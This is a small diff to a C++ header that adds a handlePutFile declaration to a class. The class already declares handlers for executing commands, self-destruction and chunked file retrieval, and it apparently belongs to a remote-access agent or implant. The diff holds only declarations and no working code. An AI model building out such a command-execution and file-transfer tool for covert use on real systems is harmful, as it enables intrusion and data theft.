@@ -30,4 +30,5 @@ private:
     std::string handleExecute(const std::string& command);
     void handleSelfDestroy();
     void handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize);
+    void handlePutFile(const std::string& path);
 };
